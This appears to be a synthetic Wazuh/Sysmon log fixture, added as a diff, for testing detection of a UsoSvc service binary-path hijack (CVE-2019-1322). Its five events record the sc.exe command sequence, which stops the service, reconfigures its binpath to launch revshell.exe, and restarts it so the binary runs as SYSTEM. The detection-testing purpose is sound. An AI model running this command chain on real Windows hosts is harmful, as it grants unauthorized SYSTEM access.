@@ -1,0 +1,409 @@
+{
+  "_metadata": {
+    "attack_id": "T1543.003",
+    "variation": "001",
+    "name": "UsoSvc Service Binary Path Hijack (CVE-2019-1322)",
+    "description": "Attacker modifies the Update Orchestrator Service (UsoSvc) binary path using sc.exe to execute arbitrary commands as SYSTEM. Exploits weak service permissions that allow standard users to reconfigure the service.",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "privilege-escalation",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - sc.exe querying UsoSvc configuration to check permissions",
+      "sequence": 1,
+      "timestamp": "2026-02-21T14:20:00.000Z",
+      "log": {
+        "timestamp": "2026-02-21T14:20:00.000+0000",
+        "rule": {
+          "level": 6,
+          "description": "Sysmon - Event 1: Service configuration query via sc.exe",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1543.003"
+            ],
+            "tactic": [
+              "Privilege Escalation",
+              "Persistence"
+            ],
+            "technique": [
+              "Create or Modify System Process: Windows Service"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1708523200.300001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION",
+              "systemTime": "2026-02-21T14:20:00.000000000Z"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-21 14:20:00.000",
+              "processGuid": "{A1B2C3D4-3333-6600-0000-000000003001}",
+              "processId": "3456",
+              "image": "C:\\Windows\\System32\\sc.exe",
+              "commandLine": "sc qc UsoSvc",
+              "currentDirectory": "C:\\Users\\attacker\\",
+              "user": "CORP\\attacker",
+              "logonGuid": "{A1B2C3D4-3333-6600-0000-000000003000}",
+              "logonId": "0x5a2f1",
+              "terminalSessionId": "1",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=c06136bca0ef0987e0bfc4cc1994dab6f4b0dfeda2fad27a6b68531f39a50d49",
+              "parentProcessGuid": "{A1B2C3D4-3333-6600-0000-000000002999}",
+              "parentProcessId": "2100",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_campaign": "Campaign 23"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - sc.exe stopping UsoSvc before reconfiguration",
+      "sequence": 2,
+      "timestamp": "2026-02-21T14:20:05.000Z",
+      "log": {
+        "timestamp": "2026-02-21T14:20:05.000+0000",
+        "rule": {
+          "level": 10,
+          "description": "Sysmon - Event 1: Service stop via sc.exe",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1543.003"
+            ],
+            "tactic": [
+              "Privilege Escalation",
+              "Persistence"
+            ],
+            "technique": [
+              "Create or Modify System Process: Windows Service"
+            ]
+          },
+          "firedtimes": 2,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1708523200.300002",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION",
+              "systemTime": "2026-02-21T14:20:05.000000000Z"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-21 14:20:05.000",
+              "processGuid": "{A1B2C3D4-3333-6600-0000-000000003002}",
+              "processId": "3460",
+              "image": "C:\\Windows\\System32\\sc.exe",
+              "commandLine": "sc stop UsoSvc",
+              "currentDirectory": "C:\\Users\\attacker\\",
+              "user": "CORP\\attacker",
+              "logonGuid": "{A1B2C3D4-3333-6600-0000-000000003000}",
+              "logonId": "0x5a2f1",
+              "terminalSessionId": "1",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=c06136bca0ef0987e0bfc4cc1994dab6f4b0dfeda2fad27a6b68531f39a50d49",
+              "parentProcessGuid": "{A1B2C3D4-3333-6600-0000-000000002999}",
+              "parentProcessId": "2100",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_campaign": "Campaign 23"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - sc.exe modifying UsoSvc binary path to attacker payload",
+      "sequence": 3,
+      "timestamp": "2026-02-21T14:20:10.000Z",
+      "log": {
+        "timestamp": "2026-02-21T14:20:10.000+0000",
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: Service binary path modification via sc.exe (privilege escalation)",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1543.003"
+            ],
+            "tactic": [
+              "Privilege Escalation",
+              "Persistence"
+            ],
+            "technique": [
+              "Create or Modify System Process: Windows Service"
+            ]
+          },
+          "firedtimes": 3,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1708523200.300003",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION",
+              "systemTime": "2026-02-21T14:20:10.000000000Z"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-21 14:20:10.000",
+              "processGuid": "{A1B2C3D4-3333-6600-0000-000000003003}",
+              "processId": "3468",
+              "image": "C:\\Windows\\System32\\sc.exe",
+              "commandLine": "sc config UsoSvc binpath=\"cmd /c C:\\Users\\Public\\revshell.exe\"",
+              "currentDirectory": "C:\\Users\\attacker\\",
+              "user": "CORP\\attacker",
+              "logonGuid": "{A1B2C3D4-3333-6600-0000-000000003000}",
+              "logonId": "0x5a2f1",
+              "terminalSessionId": "1",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=c06136bca0ef0987e0bfc4cc1994dab6f4b0dfeda2fad27a6b68531f39a50d49",
+              "parentProcessGuid": "{A1B2C3D4-3333-6600-0000-000000002999}",
+              "parentProcessId": "2100",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_campaign": "Campaign 23"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - sc.exe starting the modified UsoSvc to trigger payload",
+      "sequence": 4,
+      "timestamp": "2026-02-21T14:20:15.000Z",
+      "log": {
+        "timestamp": "2026-02-21T14:20:15.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Service start via sc.exe after modification",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1543.003"
+            ],
+            "tactic": [
+              "Privilege Escalation",
+              "Persistence"
+            ],
+            "technique": [
+              "Create or Modify System Process: Windows Service"
+            ]
+          },
+          "firedtimes": 4,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1708523200.300004",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION",
+              "systemTime": "2026-02-21T14:20:15.000000000Z"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-21 14:20:15.000",
+              "processGuid": "{A1B2C3D4-3333-6600-0000-000000003004}",
+              "processId": "3472",
+              "image": "C:\\Windows\\System32\\sc.exe",
+              "commandLine": "sc start UsoSvc",
+              "currentDirectory": "C:\\Users\\attacker\\",
+              "user": "CORP\\attacker",
+              "logonGuid": "{A1B2C3D4-3333-6600-0000-000000003000}",
+              "logonId": "0x5a2f1",
+              "terminalSessionId": "1",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=c06136bca0ef0987e0bfc4cc1994dab6f4b0dfeda2fad27a6b68531f39a50d49",
+              "parentProcessGuid": "{A1B2C3D4-3333-6600-0000-000000002999}",
+              "parentProcessId": "2100",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_campaign": "Campaign 23"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - revshell.exe executing as SYSTEM via hijacked UsoSvc",
+      "sequence": 5,
+      "timestamp": "2026-02-21T14:20:18.000Z",
+      "log": {
+        "timestamp": "2026-02-21T14:20:18.000+0000",
+        "rule": {
+          "level": 15,
+          "description": "Sysmon - Event 1: Suspicious binary executing as SYSTEM from Public directory via services.exe",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1543.003"
+            ],
+            "tactic": [
+              "Privilege Escalation",
+              "Persistence"
+            ],
+            "technique": [
+              "Create or Modify System Process: Windows Service"
+            ]
+          },
+          "firedtimes": 5,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1708523200.300005",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION",
+              "systemTime": "2026-02-21T14:20:18.000000000Z"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-21 14:20:18.000",
+              "processGuid": "{A1B2C3D4-3333-6600-0000-000000003005}",
+              "processId": "7824",
+              "image": "C:\\Users\\Public\\revshell.exe",
+              "commandLine": "C:\\Users\\Public\\revshell.exe",
+              "currentDirectory": "C:\\Windows\\System32\\",
+              "user": "NT AUTHORITY\\SYSTEM",
+              "logonGuid": "{A1B2C3D4-0000-0000-0000-000000000000}",
+              "logonId": "0x3e7",
+              "terminalSessionId": "0",
+              "integrityLevel": "System",
+              "hashes": "SHA256=aa11bb22cc33dd44ee55ff6677889900aabbccddeeff00112233445566778899",
+              "parentProcessGuid": "{A1B2C3D4-3333-6600-0000-000000003006}",
+              "parentProcessId": "688",
+              "parentImage": "C:\\Windows\\System32\\services.exe",
+              "parentCommandLine": "C:\\Windows\\System32\\services.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_campaign": "Campaign 23"
+      }
+    }
+  ]
+}
